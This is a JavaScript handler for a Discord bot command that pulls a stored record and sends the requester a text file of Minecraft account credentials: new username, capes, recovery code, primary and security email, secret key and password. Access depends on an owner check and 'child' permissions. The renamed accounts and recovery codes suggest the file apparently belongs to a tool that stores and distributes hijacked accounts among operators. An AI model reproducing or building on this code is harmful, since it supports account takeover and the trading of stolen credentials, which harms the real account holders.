const { AttachmentBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");

const isOwner = require("../../../db/isOwner");

module.exports = {
    name: "downloadacc",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            let copyTextId = interaction.customId.split("|")[1];
            const results = await queryParams("SELECT action FROM actions WHERE id = ?", [copyTextId]);

            if (!results || results.length === 0) {
                return interaction.reply({
                    content: `No action found for ID: ${copyTextId}`,
                    ephemeral: true,
                });
            }

            const parts = results[0].action.split("|");
            let ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password;

            if (parts.length >= 10) {
                [, ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
            } else {
                [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
            }

            const isUserOwner = await isOwner(interaction.user.id);
            let isAuthorized = isUserOwner || (ownerId && interaction.user.id === ownerId);

            if (!isAuthorized && ownerId) {
                const childPerm = await queryParams(
                    "SELECT viewaccounts, admin FROM users WHERE user_id = ? AND child = ?",
                    [ownerId, interaction.user.id]
                );
                if (childPerm && childPerm.length > 0 && (childPerm[0].viewaccounts === 1 || childPerm[0].admin === 1)) {
                    isAuthorized = true;
                }
            }

            if (!isAuthorized) {
                return interaction.reply({
                    content: "You are not authorized to download these credentials.",
                    ephemeral: true,
                });
            }

            const fileContent =
`Username: ${newName}
Owns MC: ${mc}
Capes: ${Array.isArray(capes) && capes.length > 0 ? capes.join(", ") : "None"}
Recovery Code: ${recoveryCode}
Primary Email: ${email}
Security Email: ${secEmail}
Secret Key: ${secretkey}
Password: ${password}`;

            const fileBuffer = Buffer.from(fileContent, 'utf-8');
            const attachment = new AttachmentBuilder(fileBuffer, { name: `${newName}.txt` });

            await interaction.reply({
                content: `${newName}`,
                files: [attachment],
                ephemeral: true,
            });
        } catch (error) {
            console.error("Error downloading account details:", error);
            return interaction.reply({
                content: "An error occurred while creating the file.",
                ephemeral: true,
            });
        }
    },
};
